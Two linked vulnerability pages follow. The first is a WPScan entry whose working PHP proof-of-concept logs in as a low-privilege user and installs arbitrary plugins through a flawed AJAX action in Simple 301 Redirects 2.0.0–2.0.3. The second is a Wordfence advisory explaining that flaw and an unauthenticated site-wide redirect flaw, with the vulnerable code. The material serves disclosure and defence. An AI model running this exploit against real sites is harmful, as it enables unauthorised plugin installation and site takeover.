=== Content from wpscan.com_e7a4e2fe_20250114_232857.html ===


[Skip to content](#wp--skip-link--target)

* [Features](https://a8cteam5105.wordpress.com/features/)
* [Pricing](https://a8cteam5105.wordpress.com/pricing/)
* Solutions
  + [Status](https://status.wpscan.com/)
  + [API Details](/api)
  + [CLI Scanner](https://a8cteam5105.wordpress.com/wordpress-cli-scanner/)
* Vulnerabilities
  + [Themes](/themes)
  + [WordPress](/wordpresses)
  + [Plugins](/plugins)
  + [Stats](/statistics)
  + [Submit Vulnerabilities](/submit)
  + [Leaderboard](/leaderboard)
* Resources
  + [Blog](/blog)
  + [Enterprise Features](https://a8cteam5105.wordpress.com/enterprise-customers-features/)
  + [How to Install WPScan](https://a8cteam5105.wordpress.com/how-to-install-wpscan/)
  + [WPScan Glossary](/wpscan-glossary)
  + [2024 Website Threat Report](https://wpscan.com/2023-website-threat-report/)

Search

## WordPress Plugin Vulnerabilities

# Simple 301 Redirects by BetterLinks - 2.0.0 – 2.0.3 - Arbitrary Plugin Installation

### Description

A lack of capability checks and insufficient nonce check on the AJAX action in the plugin, made it possible for authenticated users to install arbitrary plugins on vulnerable sites.

### Proof of Concept

<?php
// Settings
$siteurl = $argv[1];
$wp\_user = $argv[2];
$wp\_pass = $argv[3];
echo 'Logging in!';
// 1) Log in as subscriber+
$ch = curl\_init();
$cookiejar = tempnam(sys\_get\_temp\_dir(), 'cookiejar-');
curl\_setopt($ch, CURLOPT\_URL, $siteurl . '/wp-login.php');
curl\_setopt($ch, CURLOPT\_COOKIEJAR, $cookiejar);
curl\_setopt($ch, CURLOPT\_COOKIEFILE, $cookiejar);
curl\_setopt($ch, CURLOPT\_RETURNTRANSFER, true);
curl\_setopt($ch, CURLOPT\_FOLLOWLOCATION, true);
curl\_setopt($ch, CURLOPT\_POST, true);
curl\_setopt($ch, CURLOPT\_POSTFIELDS, [
'log' => $wp\_user,
'pwd' => $wp\_pass,
'rememberme' => 'forever',
'wp-submit' => 'Log+In',
]);
$output = curl\_exec($ch);
curl\_close($ch);
echo 'Getting REST API Nonce!';
$ch = curl\_init();
curl\_setopt($ch, CURLOPT\_URL, $siteurl . '/wp-admin/admin-ajax.php?action=rest-nonce');
curl\_setopt($ch, CURLOPT\_COOKIEJAR, $cookiejar);
curl\_setopt($ch, CURLOPT\_COOKIEFILE, $cookiejar);
curl\_setopt($ch, CURLOPT\_RETURNTRANSFER, true);
curl\_setopt($ch, CURLOPT\_FOLLOWLOCATION, true);
$content = curl\_exec($ch);
curl\_close($ch);
//Rest Nonce
preg\_match('/([^"]+)/', $content, $matches);
$restnonce = $matches[1];
echo $restnonce;
echo 'Installing Plugin!';
//Installing Plugin
$ch = curl\_init();
curl\_setopt( $ch, CURLOPT\_URL, $siteurl . '/wp-admin/admin-ajax.php' );
curl\_setopt( $ch, CURLOPT\_USERAGENT, 'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.13) Gecko/20080311 Firefox/2.0.0.13' );
curl\_setopt($ch, CURLOPT\_COOKIEJAR, $cookiejar);
curl\_setopt($ch, CURLOPT\_COOKIEFILE, $cookiejar);
curl\_setopt( $ch, CURLOPT\_RETURNTRANSFER, true );
curl\_setopt( $ch, CURLOPT\_FOLLOWLOCATION, true );
curl\_setopt( $ch, CURLOPT\_POST, true );
curl\_setopt( $ch, CURLOPT\_POSTFIELDS, [
'action' => 'simple301redirects/admin/install\_plugin',
'security' => $restnonce,
'slug' => 'jetpack',
] );
$output = curl\_exec($ch);
curl\_close($ch);
print($output)
?>

### Affects Plugins

[![Plugin icon](https://s2.wp.com/wp-content/themes/a8c/wpscan/assets/img/plugin-icon.svg)

simple-301-redirects](https://a8cteam5105.wordpress.com/plugin/simple-301-redirects/)

![](https://s2.wp.com/wp-content/themes/a8c/wpscan/assets/img/checkmark-green-alt.svg)
Fixed in 2.0.4

### References

CVE
[CVE-2021-24354](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-24354)

URL
<https://www.wordfence.com/blog/2021/05/severe-vulnerabilities-patched-in-simple-301-redirects-by-betterlinks-plugin/>

### Classification

Type
ACCESS CONTROLS

OWASP top 10
[A5: Broken Access Control](https://www.owasp.org/index.php/Top_10-2017_A5-Broken_Access_Control)

CWE
[CWE-284](https://cwe.mitre.org/data/definitions/284.html)

CVSS
[7.4 (high)](https://www.first.org/cvss/calculator/3.1#CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:L/I:L/A:L)

### Miscellaneous

Original Researcher
Chloe Chamberland

Submitter
Chloe Chamberland

Submitter website
<https://wordfence.com>

Submitter twitter
[infosecchloe](//twitter.com/infosecchloe)

Verified
Yes

WPVDB ID
[8638b36c-6641-491f-b9df-5db3645e4668](https://a8cteam5105.wordpress.com/vulnerability/8638b36c-6641-491f-b9df-5db3645e4668/)

### Timeline

Publicly Published
2021-05-26 (about 3 years ago)

Added
2021-05-26 (about 3 years ago)

Last Updated
2021-05-27 (about 3 years ago)

### Other

Published
Title

Published
2022-02-11
Title
[Email Subscribers & Newsletters < 5.3.2 - Unauthenticated arbitrary option update](https://a8cteam5105.wordpress.com/vulnerability/fd56191a-8a01-4ae4-a1f1-61a6ac210325/)

Published
2021-09-06
Title
[WordPress Automatic < 3.53.3 - Unauthenticated Arbitrary Options Update](https://a8cteam5105.wordpress.com/vulnerability/4e5202b8-7317-4a10-b9f3-fd6999192e15/)

Published
2024-02-16
Title
[WP Maintenance < 6.1.7 - Information Exposure](https://a8cteam5105.wordpress.com/vulnerability/83d96d31-8ae6-4ba5-9972-299c36513431/)

Published
2021-09-01
Title
[Gutenberg Template Library & Redux Framework < 4.2.13 - Contributor+ Arbitrary Plugin Installation and Post Deletion](https://a8cteam5105.wordpress.com/vulnerability/e690b887-de5f-4950-bedf-4a9f5fe9b773/)

Published
2024-04-15
Title
[Simple Registration for WooCommerce <= 1.5.6 - Unauthenticated Privilege Escalation](https://a8cteam5105.wordpress.com/vulnerability/7a298a4c-4220-4dda-8419-0d36130c33ed/)

![](https://wpscan.com/wp-content/uploads/2023/10/wpscan-logo-dark.png?w=246)

### Vulnerabilities

* [WordPress](/wordpresses)
* [Plugins](/plugins)
* [Themes](/themes)
* [Our Stats](https://a8cteam5105.wordpress.com/statistics/)
* [Submit vulnerabilities](https://a8cteam5105.wordpress.com/submit/)

#### About

* [How it works](/features)
* [Pricing](/pricing)
* [WordPress plugin](https://wordpress.org/plugins/wpscan/)
* [Blog](/blog)
* [Contact](/contact)

#### For Developers

* [Status](https://status.wpscan.com/)
* [API details](/api)
* [CLI scanner](/wordpress-cli-scanner)

#### Other

* [Privacy](https://automattic.com/privacy/)
* [Terms of service](/terms)
* [Submission terms](/submission-terms/)
* [Disclosure policy](/vulnerability-disclosure-policy)
* [Privacy Notice for California Users](https://automattic.com/privacy/#california-consumer-privacy-act-ccpa)

---

![](https://wpscan.com/wp-content/uploads/2023/08/frame-1323.png?w=48)

In partnership with [Jetpack](https://jetpack.com/)

* [GitHub](https://github.com/wpscanteam/wpscan/)
* [Twitter](https://twitter.com/_wpscan_)
* [Facebook](https://www.facebook.com/WPScan)

---

An

![](https://wpscan.com/wp-content/uploads/2023/08/autpmattic-logo.png?w=298)

endeavor

[Work With Us](https://automattic.com/work-with-us/)

[Press](https://automattic.com/press/)

* Subscribe
  Subscribed

  + [![](https://wpscan.com/wp-content/uploads/2023/08/cropped-83c25-favicon.png?w=50) WPScan](https://wpscan.com)

  Join 30,404 other subscribers

  Sign me up

  + Already have a WordPress.com account? [Log in now.](https://wordpress.com/log-in?redirect_to=https%3A%2F%2Fr-login.wordpress.com%2Fremote-login.php%3Faction%3Dlink%26back%3Dhttps%253A%252F%252Fwpscan.com%252Fblog%252Funauthorized-plugin-installation-activation-in-hunk-companion%252F)
* Privacy
* + [![](https://wpscan.com/wp-content/uploads/2023/08/cropped-83c25-favicon.png?w=50) WPScan](https://wpscan.com)
  + Subscribe
    Subscribed
  + [Sign up](https://wordpress.com/start/)
  + [Log in](https://wordpress.com/log-in?redirect_to=https%3A%2F%2Fr-login.wordpress.com%2Fremote-login.php%3Faction%3Dlink%26back%3Dhttps%253A%252F%252Fwpscan.com%252Fblog%252Funauthorized-plugin-installation-activation-in-hunk-companion%252F)
  + [Report this content](https://wordpress.com/abuse/?report_url=https://wpscan.com)
  + [View site in Reader](https://wordpress.com/read/feeds/156197069)
  + [Manage subscriptions](https://subscribe.wordpress.com/)
  + Collapse this bar

![](https://pixel.wp.com/b.gif?v=noscript)


=== Content from www.wordfence.com_080dc551_20250114_232900.html ===


![](https://www.wordfence.com/wp-content/uploads/2021/05/Severe-Vulnerabilities-Patched-in-Simple-301-Redirects-by-BetterLinks-Plugin.png)

[![](https://secure.gravatar.com/avatar/9bf72594e071c28445ed7a1be0de1a23?s=80&d=mm&r=g)Chloe Chamberland](https://www.wordfence.com/blog/author/wfchloe/)

May 26, 2021

# Severe Vulnerabilities Patched in Simple 301 Redirects by BetterLinks Plugin

On April 8, 2021, the Wordfence Threat Intelligence team initiated the responsible disclosure process for several vulnerabilities discovered in [Simple 301 Redirects by BetterLinks](https://wordpress.org/plugins/simple-301-redirects/), a WordPress plugin installed on over 300,000 sites. One of these flaws made it possible for unauthenticated users to update redirects for the site allowing an attacker to redirect all site traffic to an external malicious site. In addition, there were several remaining flaws that made it possible for authenticated users to perform actions like installing and activating plugins, in addition to less critical actions.

We initially reached out to the plugin’s developer on April 8, 2021. After establishing an appropriate communication channel, we provided the full disclosure details on April 11, 2021. An initial patch was released on April 15, 2021, and a fully patched version of the plugin was released on May 5, 2021 as version 2.0.4.

Some of these vulnerabilities are considered critical. Therefore, we highly recommend updating to the latest patched version available, 2.0.4, immediately.

Wordfence Premium users received a firewall rule to protect against any exploits targeting these vulnerabilities on April 8, 2021. Sites still using the free version of Wordfence received the same protection on May 8, 2021.

---

**Description:** Unauthenticated Redirect Import/Export (Allowing Total Site Redirection)

**Affected Plugin:** Simple 301 Redirects by BetterLinks

**Plugin Slug:** simple-301-redirects

**Affected Versions:** 2.0.0 – 2.0.3

**CVE IDS:** [CVE-2021-24352](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-24352), [CVE-2021-24353](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-24353)

**CVSS Score:** 9.9 (CRITICAL)

**CVSS Vector:** [CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:H](https://www.first.org/cvss/calculator/3.1#CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:H)

**Researcher/s:** Chloe Chamberland

**Fully Patched Version:** 2.0.4

Simple 301 Redirects by BetterLinks is a simple plugin designed to create 301 redirects on WordPress sites. In version 2.0.0 of the plugin, they introduced several new features and made additional enhancements. One of the features they introduced in the update was the ability to import and export redirects. Unfortunately, this functionality was insecurely implemented.

The developer registered two `admin_init` action hooks to the following functions: `import_data` and `export_data`. Neither of the corresponding functions had capability checks or nonce checks making it possible for users without the proper authorization to trigger the execution of the functions.

```
 class Tools {
    public function __construct()
    {
        add_action('admin_init', [$this, 'export_data']);
        add_action('admin_init', [$this, 'import_data']);
        add_action('wp_ajax_simple301redirects/admin/get_import_info', [$this, 'get_import_info']);
    }
```

The hook in use was an `admin_init` action, which made it possible for any user, regardless of authentication, to trigger the functions. This is because `admin_init` action hooks can be initialized via the `/wp-admin/admin-post.php` endpoint. This endpoint is accessible to both authenticated and unauthenticated users.

The `export_data` function could be used to export redirects, which could potentially reveal sensitive information, however, exploitation of this function would not be nearly as severe as the vulnerability within the `import_data` function. The `import_data` function takes the file contents supplied by a user and then uses the contents of the file to import a list of redirects.

```
     public function import_data()
	{
		$page = isset($_GET['page']) ? $_GET['page'] : '';
		$import = isset($_GET['import']) ? $_GET['import'] : false;
		if ($page === '301options' && $import == true) {
			if (!empty($_FILES['upload_file']['tmp_name'])) {
				$fileContent = json_decode(file_get_contents($_FILES['upload_file']['tmp_name']), true);
                if (!empty($fileContent)) {
                    $results = $this->process_data($fileContent);
                    $_SESSION['simple_301_redirects_import_info'] = json_encode($results);
                }
			}
		}
    }
```

An attacker could use this to set redirects that would deny access to a vulnerable WordPress site, causing a loss of availability, and/or redirect site visitors to malicious sites to further infect the victims’ computers.

---

**Description:** Authenticated Arbitrary Plugin Installation/Activation

**Affected Plugin:** Simple 301 Redirects by BetterLinks

**Plugin Slug:** simple-301-redirects

**Affected Versions:** 2.0.0 – 2.0.3

**CVE IDS:** [CVE-2021-24354](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-24354), [CVE-2021-24356](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-24356)

**CVSS Score:** 7.4 (HIGH)

**CVSS Vector:** [CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:L/I:L/A:L](https://www.first.org/cvss/calculator/3.1#CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:L/I:L/A:L)

**Researcher/s:** Chloe Chamberland

**Fully Patched Version:** 2.0.4

In addition to the newly implemented import functionality, the updated version of the plugin also implemented a function to install other plugins they have developed, such as BetterLinks, via a prompt in the `wp-admin` dashboard. In order to provide this functionality, the plugin registered the AJAX action `wp_ajax_simple301redirects/admin/install_plugin`, which was hooked to the `install_plugin` function.

```
 add_action('wp_ajax_simple301redirects/admin/activate_plugin', [$this, 'activate_plugin']);
```

The `install_plugin` function could be used to install any plugin from the WordPress repository by supplying the desired plugin’s name as the ‘`slug`’ parameter. This function did not have a capability check to verify that the action was triggered by an authenticated user, though it did have a nonce check.

```
     public function install_plugin()
    {
        check_ajax_referer('wp_rest', 'security');
        $slug = isset($_POST['slug']) ? $_POST['slug'] : '';
        $result = \Simple301Redirects\Helper::install_plugin($slug);
        if (is_wp_error($result)) {
            wp_send_json_error($result->get_error_message());
        }
        wp_send_json_success(__('Plugin is installed successfully!', 'simple-301-redirects'));
        wp_die();
    }
```

Unfortunately, this nonce check used the `wp_rest` action for validation. Due to the fact that this is effectively a REST-API nonce, a user could generate a valid nonce using the `rest-nonce` AJAX action that is a part of WordPress core and open to any authenticated user. This made it possible for a user to pass the nonce validation and use the plugin installation function.

In addition, an authenticated user could activate the installed plugin, or any other plugin installed on the site, by using the `wp_ajax_simple301redirects/admin/activate_plugin` AJAX endpoint hooked to the `activate_plugin` function.

```
    public function activate_plugin()
    {
        check_ajax_referer('wp_rest', 'security');
        $basename = isset($_POST['basename']) ? $_POST['basename'] : '';
        $result = activate_plugin($basename, '', false );
        if (is_wp_error($result)) {
            wp_send_json_error($result->get_error_message());
        }
        if ($result === false) {
            wp_send_json_error(__('Plugin couldn\'t be activated.', 'simple-301-redirects'));
        }
        wp_send_json_success(__('BetterLinks is activated!', 'simple-301-redirects'));
        wp_die();
```

These functions would make it possible for an authenticated attacker to install and activate any plugin from the WordPress repository, potentially one with a more severe vulnerability, that could be used to further infect and escalate privileges on the vulnerable site.

---

**Description:** Authenticated Wildcard Activation and Retrieval

**Affected Plugin:** Simple 301 Redirects by BetterLinks

**Plugin Slug:** simple-301-redirects

**Affected Versions:** 2.0.0 – 2.0.3

**CVE ID:** [CVE-2021-24355](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-24355)

**CVSS Score:** 4.3 (MEDIUM)

**CVSS Vector:** [CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:L/A:N](https://www.first.org/cvss/calculator/3.1#CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:L/A:N)

**Researcher/s:** Chloe Chamberland

**Fully Patched Version:** 2.0.4

In addition to installing and activating plugins, an authenticated user could trigger the `wp_ajax_simple301redirects/admin/wildcard` and `wp_ajax_simple301redirects/admin/get_wildcard` AJAX actions that could be used to set the “wildcard” value, used to control how broadly redirects are applied, to anarbitrary value, and retrieve the current value of the wildcard.

The corresponding functions to these action hooks, `get_wildcard` and `wildcard`, had no capability checks and suffered from the same nonce flaw as the arbitrary plugin installation and activation AJAX functions.

## Disclosure Timeline

**April 8, 2021** – Conclusion of the plugin analysis that led to the discovery of several vulnerabilities in the Simple 301 Redirects by BetterLinks plugin. We develop firewall rules to protect Wordfence customers and release them to Wordfence Premium users. We initiate contact with the plugin developer.

**April 11, 2021** – The plugin developer confirms the inbox for handling discussion.

**April 12 , 2021** – We send over full disclosure details.

**April 15, 2021** – The plugin developer releases an initial set of patches. We review the patches and determine some protection is still missing. We follow-up with the developer to inform them of what still needs to be fixed.

**April 18, 2021** – An additional patch is released.

**April 19, 2021** – We analyze the patch and determine it is still missing some protection so we follow-up again to inform them what is missing.

**April 21, 2021** – The developer confirms they will be working on the remaining fixes.

**May 4, 2021** – We follow-up to check on the status of the patches, the developer confirms that they will be released shortly.

**May 5, 2021** – A newly updated version of Simple 301 Redirects is released containing sufficient patches.

**May 8, 2021** – Free Wordfence users receive firewall rules.

## Conclusion

In today’s post, we detailed several flaws in Simple 301 Redirects by BetterLinks that granted unauthenticated attackers the ability to redirect all of a site’s visitors to an external malicious site, in addition to allowing authenticated attackers the ability to install and activate arbitrary plugins. These flaws have been fully patched in version 2.0.4. We recommend that users immediately update to the latest version available, which is version 2.0.4 at the time of this publication.

[Wordfence Premium](https://www.wordfence.com/wordfence-signup/?promo_id=blog20210526&promo_name=get-premium&promo_creative=txt&promo_position=conclusion) users received a firewall rule to protect against any exploits targeting these vulnerabilities on April 8, 2021. Sites still using the free version of Wordfence received the same protection on May 8, 2021.

If you know a friend or colleague who is using this plugin on their site, we highly recommend forwarding this advisory to them to help keep their sites protected as these are severe vulnerabilities that can lead to full site takeover.

Search

### Trust Your Site to the Leader in WordPress Security

Wordfence includes an endpoint firewall, malware scanner, robust login security features, live traffic views, and more. Discover why over 5 million WordPress sites put their trust in Wordfence.

[Protect Your Site](/products/pricing/)

**Did you enjoy this post? Share it!**

[*Facebook*](http://www.facebook.com/sharer/sharer.php?u=https%3A%2F%2Fwww.wordfence.com%2Fblog%2F2021%2F05%2Fsevere-vulnerabilities-patched-in-simple-301-redirects-by-betterlinks-plugin%2F)
[*Twitter*](https://twitter.com/share?url=https%3A%2F%2Fwww.wordfence.com%2Fblog%2F2021%2F05%2Fsevere-vulnerabilities-patched-in-simple-301-redirects-by-betterlinks-plugin%2F&text=Severe%20Vulnerabilities%20Patched%20in%20Simple%20301%20Redirects%20by%20BetterLinks%20Plugin&via=wordfence)
[*LinkedIn*](https://www.linkedin.com/shareArticle?url=https%3A%2F%2Fwww.wordfence.com%2Fblog%2F2021%2F05%2Fsevere-vulnerabilities-patched-in-simple-301-redirects-by-betterlinks-plugin%2F)

## Comments

No Comments

### Breaking WordPress Security Research in your inbox as it happens.

![Example of a news story](/img/footer-news-example.jpg)

This site uses cookies in accordance with our [Privacy Policy](/privacy-policy).

Cookie Settings
Accept All

## Cookie Options

For additional information on how this site uses cookies, please review our [Privacy Policy](/privacy-policy). The cookies used by this site are classified into the following categories and can be configured below.

### Strictly Necessary

These Cookies are necessary for the Sites and Services to work properly. They include any essential authentication and authorization cookies for the Services.

\* Cookies of this category are necessary for the site to function and cannot be disabled.

### Performance/Analytical

These Cookies allow us to collect certain information about how you navigate the Sites or utilize the Services running on your device. They help us understand which areas you use and what we can do to improve them.

### Targeting

These Cookies are used to deliver relevant information related to the Services to an identified machine or other device (not a named or otherwise identifiable person) which has previously been used to visit our Sites. Some of these types of Cookies on our Sites are operated by third parties with our permission and are used to identify advertising sources that are effectively driving customers to our Sites.

Cancel
Save


